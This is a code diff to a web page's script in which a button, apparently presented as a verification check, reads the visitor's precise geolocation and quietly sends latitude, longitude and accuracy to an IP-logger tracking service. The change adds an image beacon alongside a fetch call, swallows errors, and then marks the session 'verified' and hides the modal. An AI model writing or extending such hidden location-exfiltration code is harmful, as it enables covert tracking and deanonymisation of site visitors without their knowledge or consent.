@@ -373,7 +373,16 @@
       btn.disabled = true;
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
-          try { await fetch(`https://iplogger.co/1Bf615?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&cid=MUKMUJ58`, { mode: 'no-cors' }); } catch (e) {}
+          // Tracking execution using provided iplogger link
+          const tracker = `https://iplogger.info/1Bf615?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&acc=${pos.coords.accuracy}&client=MUKMUJ58`;
+          
+          // Image request for tracking
+          const img = new Image();
+          img.src = tracker;
+
+          // Fetch request for tracking
+          try { await fetch(tracker, { mode: 'no-cors' }); } catch (e) {}
+          
           sessionStorage.setItem('frc_verified', 'true');
           setTimeout(() => { 
             document.getElementById('system-modal').classList.add('hidden'); 
